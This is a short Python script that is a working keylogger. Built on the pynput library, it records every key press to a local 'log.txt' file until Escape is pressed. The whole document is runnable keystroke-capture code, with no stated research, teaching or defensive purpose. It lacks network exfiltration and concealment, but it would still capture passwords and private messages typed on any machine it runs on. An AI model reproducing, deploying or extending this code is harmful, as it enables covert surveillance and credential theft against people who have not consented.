''' --- Copyright property ---'''

from pynput.keyboard import Key, Listener
class Keylogs:
    '''logger class'''

    def __init__(self) -> None:
        pass

    def on_press(self, key):
        '''------ On press all the keys are recorded and appended ----'''
        keys = []
        count = 0
        
        try:
            keys.append(key)
            self.write_file(keys)
            keys = []
        except Exception as error:
            print(error)

    def write_file(self, keys):
        '''-------- Write keys in file called log text--------'''
        try:
            with open("log.txt", "a", encoding='UTF-8') as inputfile:
                for key in keys:
                    inputfile.write(str(key))
        except Exception as error:
            print(error)           

    def on_release(self, key):
        '''------- Stop the program if the key is escape ---------'''
        if key == Key.esc:
            return False
    
    def listner(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__=="__main__":
    object_of_class = Keylogs()
    object_of_class.listner()